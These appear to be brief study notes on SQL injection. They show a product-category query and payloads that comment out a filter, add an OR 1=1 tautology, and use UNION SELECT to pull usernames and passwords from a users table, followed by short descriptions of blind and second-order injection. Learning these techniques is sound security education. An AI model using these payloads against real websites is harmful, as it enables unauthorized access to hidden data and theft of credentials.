#  Examples
Base:
	`/products?category=Gifts`
	-> `SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

Attack:
	Retrieving hidden data:
	`/products?category=Gifts'--`
	`/products?category=Gifts'+OR+1=1--`
	Retrieving data from other tables:
	`/products?category=Gifts'UNION+SELECT+username,password+FROM+users--`
# Blind SQLi
When the server application doesn't return database error or query results
Attacker can't see query output
Can be seen by side effects such as: Zero division, response time, etc. 

# Second-order SQLi
Stored SQLi

1st Order -> App inputs users data into the database in an unsafe way 
2nd Order -> App takes input from database in an unsafe way